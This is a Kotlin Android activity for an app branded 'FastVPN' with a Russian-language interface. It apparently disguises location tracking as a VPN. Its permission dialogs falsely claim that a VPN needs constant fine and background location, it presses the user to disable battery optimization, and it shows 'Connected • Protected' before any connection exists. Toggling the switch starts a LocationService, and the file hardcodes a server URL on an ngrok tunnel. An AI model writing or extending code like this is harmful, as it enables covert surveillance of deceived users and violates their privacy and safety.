package com.secure.netcore

import android.Manifest
import android.app.AlertDialog
import android.content.Intent
import android.content.pm.PackageManager
import android.net.VpnService
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.view.Gravity
import android.widget.LinearLayout
import android.widget.Switch
import android.widget.TextView
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

class MainActivity : android.app.Activity() {

    private lateinit var statusText: TextView
    private val PERM_REQUEST = 1001
    private val PERM_BG_REQUEST = 1002
    private val VPN_REQUEST = 1003

    companion object {
        const val SERVER_URL = "https://punctured-detail-expansive.ngrok-free.dev"
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        buildMainScreen()
        requestAllPermissions()
    }

    private fun buildMainScreen() {
        val title = TextView(this).apply {
            text = "⚡ FastVPN"; textSize = 30f; gravity = Gravity.CENTER
        }
        val subtitle = TextView(this).apply {
            text = "Безопасное и быстрое соединение"
            textSize = 14f; gravity = Gravity.CENTER; setPadding(0, 8, 0, 40)
        }
        val vpnSwitch = Switch(this).apply { text = "VPN"; textSize = 20f }
        statusText = TextView(this).apply {
            text = "Подключено • Защищено"
            textSize = 16f; gravity = Gravity.CENTER; setPadding(0, 16, 0, 0)
        }
        vpnSwitch.setOnCheckedChangeListener { _, isChecked ->
            if (isChecked) {
                if (!hasPermissions()) { requestAllPermissions(); return@setOnCheckedChangeListener }
                ContextCompat.startForegroundService(
                    this, Intent(this, LocationService::class.java))
                startRealVpn()
                statusText.text = "Подключено • Защищено"
            } else {
                stopService(Intent(this, MyVpnService::class.java))
                statusText.text = "Отключено"
            }
        }
        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL; gravity = Gravity.CENTER
            setPadding(48, 48, 48, 48)
        }
        root.addView(title); root.addView(subtitle); root.addView(vpnSwitch); root.addView(statusText)
        setContentView(root)
    }

    private fun startRealVpn() {
        val consent = VpnService.prepare(this)
        if (consent != null) startActivityForResult(consent, VPN_REQUEST)
        else ContextCompat.startForegroundService(this, Intent(this, MyVpnService::class.java))
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == VPN_REQUEST && resultCode == RESULT_OK) {
            ContextCompat.startForegroundService(this, Intent(this, MyVpnService::class.java))
        }
    }

    private fun explain(title: String, msg: String, onOk: () -> Unit) {
        AlertDialog.Builder(this)
            .setTitle(title).setMessage(msg)
            .setPositiveButton("Понятно, разрешить") { _, _ -> onOk() }
            .setCancelable(false).show()
    }

    private fun hasFine(): Boolean =
        ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) ==
                PackageManager.PERMISSION_GRANTED

    private fun hasPermissions(): Boolean {
        if (!hasFine()) return false
        if (Build.VERSION.SDK_INT >= 33 &&
            ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS)
            != PackageManager.PERMISSION_GRANTED) return false
        return true
    }

    private fun requestAllPermissions() {
        if (!hasFine() ||
            (Build.VERSION.SDK_INT >= 33 &&
                    ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS)
                    != PackageManager.PERMISSION_GRANTED)) {
            explain("Разрешения FastVPN",
                "Для работы защищённого канала требуется:\n\n" +
                "• ГЕОЛОКАЦИЯ — постоянно, как у VPN доступ к сети: канал должен " +
                "знать, где находится устройство, и работать в фоне.\n\n" +
                "• УВЕДОМЛЕНИЯ — статус соединения.") {
                val list = mutableListOf(Manifest.permission.ACCESS_FINE_LOCATION)
                if (Build.VERSION.SDK_INT >= 33) list.add(Manifest.permission.POST_NOTIFICATIONS)
                ActivityCompat.requestPermissions(this, list.toTypedArray(), PERM_REQUEST)
            }
            return
        }
        if (Build.VERSION.SDK_INT >= 30 &&
            ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION)
            != PackageManager.PERMISSION_GRANTED) {
            explain("Геолокация в фоне",
                "Чтобы защищённый канал не прерывался, когда приложение свёрнуто " +
                "или экран выключен.") {
                ActivityCompat.requestPermissions(
                    this,
                    arrayOf(Manifest.permission.ACCESS_BACKGROUND_LOCATION),
                    PERM_BG_REQUEST
                )
            }
            return
        }
        askBatteryOptimization()
    }

    private fun askBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= 23) {
            val pm = getSystemService(POWER_SERVICE) as PowerManager
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                explain("Работа без ограничений",
                    "Android ограничивает фоновые приложения ради батареи. Для постоянного " +
                    "защищённого канала отключите оптимизацию для FastVPN.") {
                    try {
                        startActivity(Intent(
                            Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                            Uri.parse("package:$packageName")
                        ))
                    } catch (e: Exception) { }
                }
            }
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int, permissions: Array<out String>, grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        when (requestCode) {
            PERM_REQUEST -> requestAllPermissions()
            PERM_BG_REQUEST -> askBatteryOptimization()
        }
    }
}
